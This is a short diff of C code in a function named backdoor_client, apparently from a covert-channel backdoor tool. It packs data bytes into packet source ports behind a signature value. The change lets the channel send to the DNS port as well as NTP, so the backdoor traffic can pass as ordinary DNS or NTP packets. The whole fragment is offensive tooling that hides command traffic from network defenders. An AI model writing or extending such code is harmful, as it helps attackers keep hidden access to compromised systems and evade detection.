@@ -64,7 +64,10 @@ void backdoor_client(uint32 ipaddr, int dport, int chan)
 				uint8 byte = frame[j];
 				src_port = 0xFF00 & SIGNTR << 8;
 				src_port += byte;
-				dst_port = PORT_NTP;
+				if (channel == CHAN_DNS)
+					dst_port = PORT_DNS;
+				else
+					dst_port = PORT_NTP;
 
 				usleep(SLEEP_TIME);
 				_send(ipaddr, src_port, dst_port, channel);
